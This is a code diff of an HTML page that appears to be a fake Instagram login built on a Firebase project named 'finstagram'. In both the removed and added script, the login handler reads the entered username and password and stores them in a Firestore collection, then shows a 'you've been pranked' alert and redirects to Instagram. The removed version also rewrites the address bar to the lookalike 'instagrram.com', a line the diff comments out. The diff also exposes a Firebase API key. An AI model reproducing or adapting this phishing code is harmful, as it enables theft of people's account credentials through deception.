@@ -53,30 +53,35 @@
     <img width="750" height="55" src="Bottom.jpg">
 </div>
 
-<script>
-    console.log("jmmm")
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
-    import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-analytics.js";
-    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";
-      // TODO: Add SDKs for Firebase products that you want to use
-      // https://firebase.google.com/docs/web/setup#available-libraries
+<script type="text/javascript">
+  console.log(";anja");
+</script>
 
-      // Your web app's Firebase configuration
-      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-    const firebaseConfig = {
-        apiKey: "AIzaSyBDsu6TrOHuZorWSwfhDmFPgFK49r-G51U",
-        authDomain: "finstagram-aaa6b.firebaseapp.com",
-        projectId: "finstagram-aaa6b",
-        storageBucket: "finstagram-aaa6b.appspot.com",
-        messagingSenderId: "939992500515",
-        appId: "1:939992500515:web:3c267b2783a236f93de496",
-        measurementId: "G-CQD4HL65XT"
-    };
+<script type="module">
 
 
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const analytics = getAnalytics(app);
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-analytics.js";
+  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";
+    // TODO: Add SDKs for Firebase products that you want to use
+    // https://firebase.google.com/docs/web/setup#available-libraries
+
+    // Your web app's Firebase configuration
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  const firebaseConfig = {
+      apiKey: "AIzaSyBDsu6TrOHuZorWSwfhDmFPgFK49r-G51U",
+      authDomain: "finstagram-aaa6b.firebaseapp.com",
+      projectId: "finstagram-aaa6b",
+      storageBucket: "finstagram-aaa6b.appspot.com",
+      messagingSenderId: "939992500515",
+      appId: "1:939992500515:web:3c267b2783a236f93de496",
+      measurementId: "G-CQD4HL65XT"
+  };
+
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
 
 
 
@@ -90,36 +95,36 @@ var currentURL = window.location.href;
 // Modify the URL by appending a query parameter
 var modifiedURL = 'instagrram.com';
 
-history.pushState(null, null, modifiedURL);
+//history.pushState(null, null, modifiedURL);
 
 document.getElementById("login").onclick = async(e) => {
-    console.log("kiki")
+  console.log("kiki");
 
 
-    console.log("hmmmm")
-    
-    pass = document.getElementById('password').value;
-    userid = document.getElementById('username').value;
-    if (pass !== null && pass.length > 6) {
-        document.getElementById('logintxt').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-        console.log("jjjj hhh")
-        try {
-            const docRef = await addDoc(collection(db, "instadata"), {
-                user: userid,
-                password: pass
-            })
-            alert("You've been pranked! Your credentials were captured.");
-            window.location.href = "instagram.com";
+  console.log("hmmmm");
 
-        } catch (e) {
-            console.error("Error adding document: ", e);
-        }
-    }
+  pass = document.getElementById('password').value;
+  userid = document.getElementById('username').value;
+  if (pass !== null && pass.length > 6) {
+      document.getElementById('logintxt').style.display = 'none';
+      document.getElementById('loader').style.display = 'block';
+      console.log("jjjj hhh");
+      try {
+          const docRef = await addDoc(collection(db, "instadata"), {
+              user: userid,
+              password: pass
+          })
+          alert("You've been pranked! Your credentials were captured.");
+          window.location.href = "instagram.com";
+
+      } catch (e) {
+          console.error("Error adding document: ", e);
+      }
+  }
 
 };
-
 </script>
+
 
 </body>
 
